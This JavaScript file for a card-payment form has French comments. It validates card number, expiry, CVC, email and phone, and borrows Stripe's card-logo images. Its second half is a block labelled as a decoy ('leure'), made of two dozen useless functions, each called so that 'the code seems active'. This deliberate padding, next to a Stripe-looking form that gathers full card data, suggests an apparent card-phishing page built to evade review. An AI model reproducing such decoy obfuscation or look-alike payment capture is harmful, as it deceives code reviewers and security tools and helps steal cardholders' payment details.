
document.addEventListener('DOMContentLoaded', function() {
    // Liste complète des pays avec codes téléphoniques pour le test
    const countries = [
        { name: "Afghanistan", code: "93", flag: "https://flagcdn.com/w20/af.png" },
        { name: "Albania", code: "355", flag: "https://flagcdn.com/w20/al.png" },
        { name: "Algeria", code: "213", flag: "https://flagcdn.com/w20/dz.png" },
        { name: "Andorra", code: "376", flag: "https://flagcdn.com/w20/ad.png" },
        { name: "Angola", code: "244", flag: "https://flagcdn.com/w20/ao.png" },
        { name: "Antigua and Barbuda", code: "1-268", flag: "https://flagcdn.com/w20/ag.png" },
        { name: "Argentina", code: "54", flag: "https://flagcdn.com/w20/ar.png" },
        { name: "Armenia", code: "374", flag: "https://flagcdn.com/w20/am.png" },
        { name: "Australia", code: "61", flag: "https://flagcdn.com/w20/au.png" },
        { name: "Austria", code: "43", flag: "https://flagcdn.com/w20/at.png" },
        { name: "Azerbaijan", code: "994", flag: "https://flagcdn.com/w20/az.png" },
        { name: "Bahamas", code: "1-242", flag: "https://flagcdn.com/w20/bs.png" },
        { name: "Bahrain", code: "973", flag: "https://flagcdn.com/w20/bh.png" },
        { name: "Bangladesh", code: "880", flag: "https://flagcdn.com/w20/bd.png" },
        { name: "Barbados", code: "1-246", flag: "https://flagcdn.com/w20/bb.png" },
        { name: "Belarus", code: "375", flag: "https://flagcdn.com/w20/by.png" },
        { name: "Belgium", code: "32", flag: "https://flagcdn.com/w20/be.png" },
        { name: "Belize", code: "501", flag: "https://flagcdn.com/w20/bz.png" },
        { name: "Benin", code: "229", flag: "https://flagcdn.com/w20/bj.png" },
        { name: "Bhutan", code: "975", flag: "https://flagcdn.com/w20/bt.png" },
        { name: "Bolivia", code: "591", flag: "https://flagcdn.com/w20/bo.png" },
        { name: "Bosnia and Herzegovina", code: "387", flag: "https://flagcdn.com/w20/ba.png" },
        { name: "Botswana", code: "267", flag: "https://flagcdn.com/w20/bw.png" },
        { name: "Brazil", code: "55", flag: "https://flagcdn.com/w20/br.png" },
        { name: "Brunei Darussalam", code: "673", flag: "https://flagcdn.com/w20/bn.png" },
        { name: "Bulgaria", code: "359", flag: "https://flagcdn.com/w20/bg.png" },
        { name: "Burkina Faso", code: "226", flag: "https://flagcdn.com/w20/bf.png" },
        { name: "Burundi", code: "257", flag: "https://flagcdn.com/w20/bi.png" },
        { name: "Cabo Verde", code: "238", flag: "https://flagcdn.com/w20/cv.png" },
        { name: "Cambodia", code: "855", flag: "https://flagcdn.com/w20/kh.png" },
        { name: "Cameroon", code: "237", flag: "https://flagcdn.com/w20/cm.png" },
        { name: "Canada", code: "1", flag: "https://flagcdn.com/w20/ca.png" },
        { name: "Central African Republic", code: "236", flag: "https://flagcdn.com/w20/cf.png" },
        { name: "Chad", code: "235", flag: "https://flagcdn.com/w20/td.png" },
        { name: "Chile", code: "56", flag: "https://flagcdn.com/w20/cl.png" },
        { name: "China", code: "86", flag: "https://flagcdn.com/w20/cn.png" },
        { name: "Colombia", code: "57", flag: "https://flagcdn.com/w20/co.png" },
        { name: "Comoros", code: "269", flag: "https://flagcdn.com/w20/km.png" },
        { name: "Congo", code: "242", flag: "https://flagcdn.com/w20/cg.png" },
        { name: "Costa Rica", code: "506", flag: "https://flagcdn.com/w20/cr.png" },
        { name: "Croatia", code: "385", flag: "https://flagcdn.com/w20/hr.png" },
        { name: "Cuba", code: "53", flag: "https://flagcdn.com/w20/cu.png" },
        { name: "Cyprus", code: "357", flag: "https://flagcdn.com/w20/cy.png" },
        { name: "Czechia", code: "420", flag: "https://flagcdn.com/w20/cz.png" },
        { name: "Democratic Republic of the Congo", code: "243", flag: "https://flagcdn.com/w20/cd.png" },
        { name: "Denmark", code: "45", flag: "https://flagcdn.com/w20/dk.png" },
        { name: "Djibouti", code: "253", flag: "https://flagcdn.com/w20/dj.png" },
        { name: "Dominica", code: "1-767", flag: "https://flagcdn.com/w20/dm.png" },
        { name: "Dominican Republic", code: "1-809", flag: "https://flagcdn.com/w20/do.png" },
        { name: "Ecuador", code: "593", flag: "https://flagcdn.com/w20/ec.png" },
        { name: "Egypt", code: "20", flag: "https://flagcdn.com/w20/eg.png" },
        { name: "El Salvador", code: "503", flag: "https://flagcdn.com/w20/sv.png" },
        { name: "Equatorial Guinea", code: "240", flag: "https://flagcdn.com/w20/gq.png" },
        { name: "Eritrea", code: "291", flag: "https://flagcdn.com/w20/er.png" },
        { name: "Estonia", code: "372", flag: "https://flagcdn.com/w20/ee.png" },
        { name: "Eswatini", code: "268", flag: "https://flagcdn.com/w20/sz.png" },
        { name: "Ethiopia", code: "251", flag: "https://flagcdn.com/w20/et.png" },
        { name: "Fiji", code: "679", flag: "https://flagcdn.com/w20/fj.png" },
        { name: "Finland", code: "358", flag: "https://flagcdn.com/w20/fi.png" },
        { name: "France", code: "33", flag: "https://flagcdn.com/w20/fr.png" },
        { name: "Gabon", code: "241", flag: "https://flagcdn.com/w20/ga.png" },
        { name: "Gambia", code: "220", flag: "https://flagcdn.com/w20/gm.png" },
        { name: "Georgia", code: "995", flag: "https://flagcdn.com/w20/ge.png" },
        { name: "Germany", code: "49", flag: "https://flagcdn.com/w20/de.png" },
        { name: "Ghana", code: "233", flag: "https://flagcdn.com/w20/gh.png" },
        { name: "Greece", code: "30", flag: "https://flagcdn.com/w20/gr.png" },
        { name: "Grenada", code: "1-473", flag: "https://flagcdn.com/w20/gd.png" },
        { name: "Guatemala", code: "502", flag: "https://flagcdn.com/w20/gt.png" },
        { name: "Guinea", code: "224", flag: "https://flagcdn.com/w20/gn.png" },
        { name: "Guinea-Bissau", code: "245", flag: "https://flagcdn.com/w20/gw.png" },
        { name: "Guyana", code: "592", flag: "https://flagcdn.com/w20/gy.png" },
        { name: "Haiti", code: "509", flag: "https://flagcdn.com/w20/ht.png" },
        { name: "Honduras", code: "504", flag: "https://flagcdn.com/w20/hn.png" },
        { name: "Hungary", code: "36", flag: "https://flagcdn.com/w20/hu.png" },
        { name: "Iceland", code: "354", flag: "https://flagcdn.com/w20/is.png" },
        { name: "India", code: "91", flag: "https://flagcdn.com/w20/in.png" },
        { name: "Indonesia", code: "62", flag: "https://flagcdn.com/w20/id.png" },
        { name: "Iran", code: "98", flag: "https://flagcdn.com/w20/ir.png" },
        { name: "Iraq", code: "964", flag: "https://flagcdn.com/w20/iq.png" },
        { name: "Ireland", code: "353", flag: "https://flagcdn.com/w20/ie.png" },
        { name: "Israel", code: "972", flag: "https://flagcdn.com/w20/il.png" },
        { name: "Italy", code: "39", flag: "https://flagcdn.com/w20/it.png" },
        { name: "Jamaica", code: "1-876", flag: "https://flagcdn.com/w20/jm.png" },
        { name: "Japan", code: "81", flag: "https://flagcdn.com/w20/jp.png" },
        { name: "Jordan", code: "962", flag: "https://flagcdn.com/w20/jo.png" },
        { name: "Kazakhstan", code: "7", flag: "https://flagcdn.com/w20/kz.png" },
        { name: "Kenya", code: "254", flag: "https://flagcdn.com/w20/ke.png" },
        { name: "Kiribati", code: "686", flag: "https://flagcdn.com/w20/ki.png" },
        { name: "Kuwait", code: "965", flag: "https://flagcdn.com/w20/kw.png" },
        { name: "Kyrgyzstan", code: "996", flag: "https://flagcdn.com/w20/kg.png" },
        { name: "Laos", code: "856", flag: "https://flagcdn.com/w20/la.png" },
        { name: "Latvia", code: "371", flag: "https://flagcdn.com/w20/lv.png" },
        { name: "Lebanon", code: "961", flag: "https://flagcdn.com/w20/lb.png" },
        { name: "Lesotho", code: "266", flag: "https://flagcdn.com/w20/ls.png" },
        { name: "Liberia", code: "231", flag: "https://flagcdn.com/w20/lr.png" },
        { name: "Libya", code: "218", flag: "https://flagcdn.com/w20/ly.png" },
        { name: "Liechtenstein", code: "423", flag: "https://flagcdn.com/w20/li.png" },
        { name: "Lithuania", code: "370", flag: "https://flagcdn.com/w20/lt.png" },
        { name: "Luxembourg", code: "352", flag: "https://flagcdn.com/w20/lu.png" },
        { name: "Madagascar", code: "261", flag: "https://flagcdn.com/w20/mg.png" },
        { name: "Malawi", code: "265", flag: "https://flagcdn.com/w20/mw.png" },
        { name: "Malaysia", code: "60", flag: "https://flagcdn.com/w20/my.png" },
        { name: "Maldives", code: "960", flag: "https://flagcdn.com/w20/mv.png" },
        { name: "Mali", code: "223", flag: "https://flagcdn.com/w20/ml.png" },
        { name: "Malta", code: "356", flag: "https://flagcdn.com/w20/mt.png" },
        { name: "Marshall Islands", code: "692", flag: "https://flagcdn.com/w20/mh.png" },
        { name: "Mauritania", code: "222", flag: "https://flagcdn.com/w20/mr.png" },
        { name: "Mauritius", code: "230", flag: "https://flagcdn.com/w20/mu.png" },
        { name: "Mexico", code: "52", flag: "https://flagcdn.com/w20/mx.png" },
        { name: "Micronesia", code: "691", flag: "https://flagcdn.com/w20/fm.png" },
        { name: "Moldova", code: "373", flag: "https://flagcdn.com/w20/md.png" },
        { name: "Monaco", code: "377", flag: "https://flagcdn.com/w20/mc.png" },
        { name: "Mongolia", code: "976", flag: "https://flagcdn.com/w20/mn.png" },
        { name: "Montenegro", code: "382", flag: "https://flagcdn.com/w20/me.png" },
        { name: "Morocco", code: "212", flag: "https://flagcdn.com/w20/ma.png" },
        { name: "Mozambique", code: "258", flag: "https://flagcdn.com/w20/mz.png" },
        { name: "Myanmar", code: "95", flag: "https://flagcdn.com/w20/mm.png" },
        { name: "Namibia", code: "264", flag: "https://flagcdn.com/w20/na.png" },
        { name: "Nauru", code: "674", flag: "https://flagcdn.com/w20/nr.png" },
        { name: "Nepal", code: "977", flag: "https://flagcdn.com/w20/np.png" },
        { name: "Netherlands", code: "31", flag: "https://flagcdn.com/w20/nl.png" },
        { name: "New Zealand", code: "64", flag: "https://flagcdn.com/w20/nz.png" },
        { name: "Nicaragua", code: "505", flag: "https://flagcdn.com/w20/ni.png" },
        { name: "Niger", code: "227", flag: "https://flagcdn.com/w20/ne.png" },
        { name: "Nigeria", code: "234", flag: "https://flagcdn.com/w20/ng.png" },
        { name: "North Korea", code: "850", flag: "https://flagcdn.com/w20/kp.png" },
        { name: "North Macedonia", code: "389", flag: "https://flagcdn.com/w20/mk.png" },
        { name: "Norway", code: "47", flag: "https://flagcdn.com/w20/no.png" },
        { name: "Oman", code: "968", flag: "https://flagcdn.com/w20/om.png" },
        { name: "Pakistan", code: "92", flag: "https://flagcdn.com/w20/pk.png" },
        { name: "Palau", code: "680", flag: "https://flagcdn.com/w20/pw.png" },
        { name: "Palestine", code: "970", flag: "https://flagcdn.com/w20/ps.png" },
        { name: "Panama", code: "507", flag: "https://flagcdn.com/w20/pa.png" },
        { name: "Papua New Guinea", code: "675", flag: "https://flagcdn.com/w20/pg.png" },
        { name: "Paraguay", code: "595", flag: "https://flagcdn.com/w20/py.png" },
        { name: "Peru", code: "51", flag: "https://flagcdn.com/w20/pe.png" },
        { name: "Philippines", code: "63", flag: "https://flagcdn.com/w20/ph.png" },
        { name: "Poland", code: "48", flag: "https://flagcdn.com/w20/pl.png" },
        { name: "Portugal", code: "351", flag: "https://flagcdn.com/w20/pt.png" },
        { name: "Qatar", code: "974", flag: "https://flagcdn.com/w20/qa.png" },
        { name: "Romania", code: "40", flag: "https://flagcdn.com/w20/ro.png" },
        { name: "Russia", code: "7", flag: "https://flagcdn.com/w20/ru.png" },
        { name: "Rwanda", code: "250", flag: "https://flagcdn.com/w20/rw.png" },
        { name: "Saint Kitts and Nevis", code: "1-869", flag: "https://flagcdn.com/w20/kn.png" },
        { name: "Saint Lucia", code: "1-758", flag: "https://flagcdn.com/w20/lc.png" },
        { name: "Saint Vincent and the Grenadines", code: "1-784", flag: "https://flagcdn.com/w20/vc.png" },
        { name: "Samoa", code: "685", flag: "https://flagcdn.com/w20/ws.png" },
        { name: "San Marino", code: "378", flag: "https://flagcdn.com/w20/sm.png" },
        { name: "Sao Tome and Principe", code: "239", flag: "https://flagcdn.com/w20/st.png" },
        { name: "Saudi Arabia", code: "966", flag: "https://flagcdn.com/w20/sa.png" },
        { name: "Senegal", code: "221", flag: "https://flagcdn.com/w20/sn.png" },
        { name: "Serbia", code: "381", flag: "https://flagcdn.com/w20/rs.png" },
        { name: "Seychelles", code: "248", flag: "https://flagcdn.com/w20/sc.png" },
        { name: "Sierra Leone", code: "232", flag: "https://flagcdn.com/w20/sl.png" },
        { name: "Singapore", code: "65", flag: "https://flagcdn.com/w20/sg.png" },
        { name: "Slovakia", code: "421", flag: "https://flagcdn.com/w20/sk.png" },
        { name: "Slovenia", code: "386", flag: "https://flagcdn.com/w20/si.png" },
        { name: "Solomon Islands", code: "677", flag: "https://flagcdn.com/w20/sb.png" },
        { name: "Somalia", code: "252", flag: "https://flagcdn.com/w20/so.png" },
        { name: "South Africa", code: "27", flag: "https://flagcdn.com/w20/za.png" },
        { name: "South Korea", code: "82", flag: "https://flagcdn.com/w20/kr.png" },
        { name: "South Sudan", code: "211", flag: "https://flagcdn.com/w20/ss.png" },
        { name: "Spain", code: "34", flag: "https://flagcdn.com/w20/es.png" },
        { name: "Sri Lanka", code: "94", flag: "https://flagcdn.com/w20/lk.png" },
        { name: "Sudan", code: "249", flag: "https://flagcdn.com/w20/sd.png" },
        { name: "Suriname", code: "597", flag: "https://flagcdn.com/w20/sr.png" },
        { name: "Sweden", code: "46", flag: "https://flagcdn.com/w20/se.png" },
        { name: "Switzerland", code: "41", flag: "https://flagcdn.com/w20/ch.png" },
        { name: "Syria", code: "963", flag: "https://flagcdn.com/w20/sy.png" },
        { name: "Taiwan", code: "886", flag: "https://flagcdn.com/w20/tw.png" },
        { name: "Tajikistan", code: "992", flag: "https://flagcdn.com/w20/tj.png" },
        { name: "Tanzania", code: "255", flag: "https://flagcdn.com/w20/tz.png" },
        { name: "Thailand", code: "66", flag: "https://flagcdn.com/w20/th.png" },
        { name: "Timor-Leste", code: "670", flag: "https://flagcdn.com/w20/tl.png" },
        { name: "Togo", code: "228", flag: "https://flagcdn.com/w20/tg.png" },
        { name: "Tonga", code: "676", flag: "https://flagcdn.com/w20/to.png" },
        { name: "Trinidad and Tobago", code: "1-868", flag: "https://flagcdn.com/w20/tt.png" },
        { name: "Tunisia", code: "216", flag: "https://flagcdn.com/w20/tn.png" },
        { name: "Turkey", code: "90", flag: "https://flagcdn.com/w20/tr.png" },
        { name: "Turkmenistan", code: "993", flag: "https://flagcdn.com/w20/tm.png" },
        { name: "Tuvalu", code: "688", flag: "https://flagcdn.com/w20/tv.png" },
        { name: "Uganda", code: "256", flag: "https://flagcdn.com/w20/ug.png" },
        { name: "Ukraine", code: "380", flag: "https://flagcdn.com/w20/ua.png" },
        { name: "United Arab Emirates", code: "971", flag: "https://flagcdn.com/w20/ae.png" },
        { name: "United Kingdom", code: "44", flag: "https://flagcdn.com/w20/gb.png" },
        { name: "United States", code: "1", flag: "https://flagcdn.com/w20/us.png" },
        { name: "Uruguay", code: "598", flag: "https://flagcdn.com/w20/uy.png" },
        { name: "Uzbekistan", code: "998", flag: "https://flagcdn.com/w20/uz.png" },
        { name: "Vanuatu", code: "678", flag: "https://flagcdn.com/w20/vu.png" },
        { name: "Vatican City", code: "379", flag: "https://flagcdn.com/w20/va.png" },
        { name: "Venezuela", code: "58", flag: "https://flagcdn.com/w20/ve.png" },
        { name: "Vietnam", code: "84", flag: "https://flagcdn.com/w20/vn.png" },
        { name: "Yemen", code: "967", flag: "https://flagcdn.com/w20/ye.png" },
        { name: "Zambia", code: "260", flag: "https://flagcdn.com/w20/zm.png" },
        { name: "Zimbabwe", code: "263", flag: "https://flagcdn.com/w20/zw.png" }
    ];

    const dropdownContent = document.querySelector('.dropdown-content');
    const letters = {};

    countries.forEach(country => {
        const firstLetter = country.name.charAt(0).toUpperCase();
        if (!letters[firstLetter]) {
            letters[firstLetter] = [];
        }
        letters[firstLetter].push(country);
    });

    for (const letter in letters) {
        const section = document.createElement('div');
        section.className = 'dropdown-section';
        section.textContent = letter;
        dropdownContent.appendChild(section);

        letters[letter].forEach(country => {
            const item = document.createElement('div');
            item.className = 'dropdown-item';
            item.tabIndex = 0;
            item.innerHTML = `
                <img src="${country.flag}" alt="${country.name}" class="country-flag">
                ${country.name} <span class="country-indicative">(+${country.code})</span>
            `;
            item.addEventListener('click', function() {
                selectCountry(country.flag, country.code);
            });
            item.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    selectCountry(country.flag, country.code);
                }
            });
            dropdownContent.appendChild(item);
        });
    }

    function toggleDropdown() {
        const dropdown = document.querySelector('.dropdown');
        const dropdownContent = dropdown.querySelector('.dropdown-content');
        const isActive = dropdown.classList.toggle('active');
    
        if (isActive) {
            adjustDropdownDirection();
        } else {
            dropdownContent.classList.remove('open-up', 'open-down');
        }
    }

    const dropdownButton = document.getElementById('dropdownButton');
    dropdownButton.addEventListener('click', function(event) {
        event.stopPropagation();
        toggleDropdown();
    });

    function selectCountry(countryImage, countryCode) {
        const button = document.getElementById('dropdownButton');
        button.innerHTML = `<img src="${countryImage}" class="country-image" alt="Drapeau"> <i class="fas fa-chevron-down dropdown-arrow"></i>`;
        toggleDropdown();
        const phoneInput = document.getElementById('countryCodeInput');
        phoneInput.value = `+${countryCode} `;
        phoneInput.focus();
    }

    window.addEventListener('click', function(event) {
        if (!event.target.closest('.dropdown-button') && !event.target.closest('.dropdown-content')) {
            const dropdowns = document.getElementsByClassName('dropdown');
            for (let i = 0; i < dropdowns.length; i++) {
                const openDropdown = dropdowns[i];
                if (openDropdown.classList.contains('active')) {
                    openDropdown.classList.remove('active');
                }
            }
        }
    });

    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') {
            const dropdowns = document.getElementsByClassName('dropdown');
            for (let i = 0; i < dropdowns.length; i++) {
                const openDropdown = dropdowns[i];
                if (openDropdown.classList.contains('active')) {
                    openDropdown.classList.remove('active');
                }
            }
        }
    });

    let currentImageIndex = 0;
    const images = [
        "https://js.stripe.com/v3/fingerprinted/img/discover-ac52cd46f89fa40a29a0bfb954e33173.svg",
        "https://js.stripe.com/v3/fingerprinted/img/jcb-271fd06e6e7a2c52692ffa91a95fb64f.svg",
        "https://js.stripe.com/v3/fingerprinted/img/diners-fbcbd3360f8e3f629cdaa80e93abdb8b.svg",
        "https://js.stripe.com/v3/fingerprinted/img/unionpay-8a10aefc7295216c338ba4e1224627a1.svg"
    ];

    function changeImage() {
        const slideshowImage = document.getElementById('slideshowImage');
        slideshowImage.style.opacity = 0;
        setTimeout(() => {
            currentImageIndex = (currentImageIndex + 1) % images.length;
            slideshowImage.src = images[currentImageIndex];
            slideshowImage.style.opacity = 1;
        }, 500);
    }

    setInterval(changeImage, 3000);

    const emailInput = document.getElementById('emailInput');
    const emailError = document.getElementById('emailError');

    emailInput.addEventListener('input', function() {
        if (!validateEmail(this.value)) {
            emailError.textContent = 'Adresse email invalide';
            emailError.classList.remove('valid');
            emailError.classList.add('invalid');
            emailError.style.display = 'block';
        } else {
            emailError.textContent = '';
            emailError.classList.remove('invalid');
            emailError.classList.add('valid');
            emailError.style.display = 'block';
        }
    });

    function validateEmail(email) {
        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return re.test(email);
    }

    const phoneInputField = document.getElementById('countryCodeInput');
    const phoneError = document.getElementById('phoneError');

    phoneInputField.addEventListener('input', function() {
        this.value = this.value.replace(/(?!^\+)\D/g, '');
        const digits = this.value.replace(/\D/g, '');
        if (digits.length < 7) {
            phoneError.textContent = 'Numéro de téléphone invalide';
            phoneError.classList.remove('valid');
            phoneError.classList.add('invalid');
            phoneError.style.display = 'block';
        } else {
            phoneError.textContent = '';
            phoneError.classList.remove('invalid');
            phoneError.classList.add('valid');
            phoneError.style.display = 'block';
        }
    });

    const expiryInput = document.getElementById('expiryInput');
    const expiryError = document.getElementById('expiryError');

    expiryInput.addEventListener('input', function() {
        this.value = formatExpiryDate(this.value);
        if (!validateExpiryDate(this.value)) {
            expiryError.textContent = 'Date d\'expiration invalide';
            expiryError.classList.remove('valid');
            expiryError.classList.add('invalid');
            expiryError.style.display = 'block';
        } else {
            expiryError.textContent = '';
            expiryError.classList.remove('invalid');
            expiryError.classList.add('valid');
            expiryError.style.display = 'block';
        }
    });

    function formatExpiryDate(value) {
        value = value.replace(/\D/g, '');
        if (value.length === 1 && value > 1) {
            value = '0' + value;
        }
        if (value.length >= 2 && parseInt(value.substring(0, 2)) > 12) {
            value = '01' + value.substring(2);
        }
        if (value.length >= 3) {
            return `${value.substring(0, 2)}/${value.substring(2, 4)}`;
        }
        return value;
    }

    function validateExpiryDate(value) {
        const [month, year] = value.split('/').map(num => parseInt(num, 10));
        if (!month || !year || month > 12 || month < 1) return false;

        const now = new Date();
        const currentYear = now.getFullYear() % 100;
        const currentMonth = now.getMonth() + 1;
        const expiryYearLimit = currentYear + 10;

        if (year < currentYear || year > expiryYearLimit) return false;
        if (year === currentYear && month < currentMonth) return false;

        return true;
    }

    const cvcInput = document.getElementById('cvcInput');
    const cvcError = document.getElementById('cvcError');

    cvcInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').substring(0, 3);
        if (this.value.length !== 3) {
            cvcError.textContent = 'Code CVC invalide';
            cvcError.classList.remove('valid');
            cvcError.classList.add('invalid');
            cvcError.style.display = 'block';
        } else {
            cvcError.textContent = '';
            cvcError.classList.remove('invalid');
            cvcError.classList.add('valid');
            cvcError.style.display = 'block';
        }
    });

    const cardInput = document.getElementById('card-number');
    const cardLogoLeft = document.getElementById('cardLogoLeft');
    const issuerInfo = document.getElementById('issuer-info');
    const cardError = document.createElement('p');
    cardError.classList.add('result', 'invalid');
    cardError.style.display = 'none'; // Cacher par défaut
    cardError.textContent = 'Numéro de carte invalide';

    cardInput.insertAdjacentElement('afterend', cardError);

    cardInput.addEventListener('input', function() {
        let cardNumber = this.value.replace(/\s+/g, '');
        let issuerData = identifyCardIssuer(cardNumber);

        if (cardNumber.length > 0) {
            cardError.style.display = 'none';
        }

        this.value = formatCardNumber(cardNumber.substring(0, 19));
        cardLogoLeft.src = issuerData.image;
        cardLogoLeft.style.display = issuerData.image ? 'block' : 'none';

        if (cardNumber.length >= 13) {
            let luhnValid = validateLuhn(cardNumber);
            issuerInfo.textContent = '';
            if (luhnValid) {
                issuerInfo.textContent += '';
                issuerInfo.className = 'result valid';
            } else {
                issuerInfo.textContent += ' (Numéro invalide)';
                issuerInfo.className = 'result invalid';
            }
        } else if (cardNumber.length > 0) {
            issuerInfo.textContent = '';
            issuerInfo.className = 'result';
        } else {
            issuerInfo.textContent = '(Numéro invalide)';
            issuerInfo.className = 'result invalid';
        }
    });

    function identifyCardIssuer(cardNumber) {
        cardNumber = cardNumber.replace(/\s+/g, '');
        if (/^4/.test(cardNumber)) {
            return { issuer: 'Visa', image: 'https://js.stripe.com/v3/fingerprinted/img/visa-729c05c240c4bdb47b03ac81d9945bfe.svg' };
        } else if (/^5[1-5]/.test(cardNumber) || /^2[2-7]/.test(cardNumber)) {
            return { issuer: 'MasterCard', image: 'https://js.stripe.com/v3/fingerprinted/img/mastercard-4d8844094130711885b5e41b28c9848f.svg' };
        } else if (/^3[47]/.test(cardNumber)) {
            return { issuer: 'American Express', image: 'https://js.stripe.com/v3/fingerprinted/img/amex-a49b82f46c5cd6a96a6e418a6ca1717c.svg' };
        } else if (/^6(?:011|5)/.test(cardNumber)) {
            return { issuer: 'Discover', image: 'https://js.stripe.com/v3/fingerprinted/img/discover-ac52cd46f89fa40a29a0bfb954e33173.svg' };
        } else {
            return { issuer: '', image: '' };
        }
    }

    function validateLuhn(cardNumber) {
        let sum = 0;
        let shouldDouble = false;
        for (let i = cardNumber.length - 1; i >= 0; i--) {
            let digit = parseInt(cardNumber[i]);
            if (shouldDouble) {
                digit *= 2;
                if (digit > 9) {
                    digit -= 9;
                }
            }
            sum += digit;
            shouldDouble = !shouldDouble;
        }
        return (sum % 10) === 0;
    }

    function formatCardNumber(value) {
        return value.replace(/\D/g, '')
                    .replace(/(\d{4})(?=\d)/g, '$1 ')
                    .trim();
    }

    // leure*********************************************************************************************************************************************************************
    // leure************************************************************************************************************************************
    // leure************************************************************************************************************************************
    // Fonction inutile qui vérifie des conditions complexes
    function checkRandomConditions(val) {
        if (val % 2 === 0 && val > 50) {
            return "Even and large";
        } else if (val % 3 === 0) {
            return "Divisible by 3";
        } else {
            return "Nothing interesting";
        }
    }

    // Fonction qui effectue des manipulations de chaînes mais ne fait rien d'utile
    function stringManipulation(str) {
        let result = str.split('').reverse().join(''); // Inverse la chaîne
        if (result.length > 5) {
            result = result.slice(0, 5);  // Coupe si la chaîne est trop longue
        }
        return result;
    }

    // Fonction qui simule une série de calculs inutiles
    function randomCalculations() {
        let x = Math.random() * 100;
        let y = Math.pow(x, 2);
        let z = Math.sqrt(y) / x;
        return x + y - z;
    }

    // Fonction avec des boucles imbriquées inutiles
    function loopForNothing() {
        for (let i = 0; i < 10; i++) {
            for (let j = 0; j < 10; j++) {
                if (i * j > 50) {
                    return i * j;
                }
            }
        }
        return 0;
    }

    // Fonction qui utilise un try-catch pour rien
    function tryCatchForNothing() {
        try {
            let a = "This does nothing!";
            JSON.parse(a);  // Provoque une erreur exprès
        } catch (error) {
            return "Caught an error, moving on...";
        }
    }

    // Fonction qui génère un tableau et le manipule inutilement
    function arrayManipulation() {
        let arr = [];
        for (let i = 0; i < 10; i++) {
            arr.push(i);
        }
        arr = arr.filter(num => num % 2 === 0);  // Garde seulement les nombres pairs
        return arr.map(num => num * 2);  // Double les valeurs du tableau
    }

    // Fonction qui attend simplement un certain temps avec setTimeout mais n'attend pas vraiment
    function fakeAsyncOperation() {
        setTimeout(function() {
            console.log("This is just a fake async operation.");
        }, 1000);
    }

    // Fonction qui retourne toujours la même chose après des conditions complexes
    function complexCondition() {
        let a = Math.random();
        let b = Math.random();
        if (a > b && b < 0.5) {
            return "Case A";
        } else if (b > 0.9) {
            return "Case B";
        } else {
            return "None of the above";
        }
    }

    // Fonction qui manipule des objets sans aucun impact
    function objectManipulation() {
        let obj = { name: "John", age: 25 };
        obj.name = "Doe";
        obj.age += 10;
        return Object.keys(obj).join(',');
    }

    // Fonction qui simule une validation inutile
    function fakeValidation(value) {
        if (value === undefined || value === null) {
            return false;
        }
        return true;
    }

    // Fonction avec des calculs logiques complexes mais inutiles
    function logicalOperation(a, b) {
        if ((a > 10 && b < 5) || (a === b)) {
            return a + b;
        }
        return a - b;
    }

    // Fonction avec une boucle infinie cassée prématurément
    function fakeInfiniteLoop() {
        while (true) {
            if (Math.random() > 0.9999) {
                break;
            }
        }
        return "Loop exited";
    }

    // Fonction qui concatène des chaînes inutilement
    function uselessConcatenation(str1, str2) {
        let result = str1 + " " + str2;
        for (let i = 0; i < 5; i++) {
            result += " " + i;
        }
        return result;
    }

    // Fonction qui renverse un tableau et ne fait rien de plus
    function reverseArray(arr) {
        let reversed = arr.reverse();
        return reversed.join(',');  // Retourne une chaîne juste pour rien
    }

    // Une fonction qui ne retourne jamais vrai
    function neverTrue() {
        if (1 === 2) {
            return true;
        }
        return false;
    }

    // Fonction qui génère des nombres aléatoires mais ne les utilise jamais
    function generateRandomNumbers() {
        let numbers = [];
        for (let i = 0; i < 10; i++) {
            numbers.push(Math.random() * 100);
        }
        return numbers;
    }

    // Fonction qui simule des opérations sur des dates mais qui ne sert à rien
    function dateManipulation() {
        let date = new Date();
        let futureDate = new Date(date.getTime() + 1000000);
        if (futureDate > date) {
            return "Future date is greater";
        }
        return "This will never happen";
    }

    // Fonction avec des opérations ternaires inutiles
    function ternaryOperation(a, b) {
        return (a > b) ? (a - b) : (b - a);
    }

    // Fonction qui initialise des variables sans les utiliser
    function unusedVariables() {
        let x = 10;
        let y = 20;
        let z = x + y;
        return "Done with unused variables.";
    }

    // Fonction qui simule une série de switch/case inutiles
    function uselessSwitch(value) {
        switch (value) {
            case 'A':
                return "Case A";
            case 'B':
                return "Case B";
            default:
                return "No matching case";
        }
    }

    // Fonction qui génère un nombre aléatoire puis ne fait rien avec
    function randomNumberGenerator() {
        let randomNum = Math.random();
        return "Random number generated but not used: " + randomNum;
    }

    // Fonction avec des instructions complexes mais inutiles
    function complexInstructions() {
        let obj = { a: 1, b: 2 };
        let arr = [3, 4, 5];
        let str = "Complex!";
        return obj.a + arr[1] + str.length;
    }

    // Fonction qui retourne une chaîne aléatoire mais sans aucune utilité
    function generateRandomString() {
        let chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        let result = '';
        for (let i = 0; i < 10; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }

    // Une fonction finale qui ne fait rien avec un gros try/catch
    function finalFunction() {
        try {
            let val = Math.random() * 100;
            val = Math.pow(val, 2);
            let result = val / (Math.random() * 10);
            return "Final result is: " + result;
        } catch (e) {
            return "Caught an error!";
        }
    }

    // Appels de toutes les fonctions pour que le code semble actif
    checkRandomConditions(51);
    stringManipulation("Example");
    randomCalculations();
    loopForNothing();
    tryCatchForNothing();
    arrayManipulation();
    fakeAsyncOperation();
    complexCondition();
    objectManipulation();
    fakeValidation("value");
    logicalOperation(15, 3);
    fakeInfiniteLoop();
    uselessConcatenation("Hello", "World");
    reverseArray([1, 2, 3]);
    neverTrue();
    generateRandomNumbers();
    dateManipulation();
    ternaryOperation(5, 10);
    unusedVariables();
    uselessSwitch('C');
    randomNumberGenerator();
    complexInstructions();
    generateRandomString();
    finalFunction();

    // leure************************************************************************************************************************************
    // leure*********************************// leure************************************************************************************************************************************
    // leure************************************************************************************************************************************
    // leure************************************************************************************************************************************

    // Fonction qui génère un tableau bidimensionnel mais ne fait rien d'utile
    function generate2DArray() {
        let arr = [];
        for (let i = 0; i < 5; i++) {
            let row = [];
            for (let j = 0; j < 5; j++) {
                row.push(i * j);
            }
            arr.push(row);
        }
        return arr;
    }

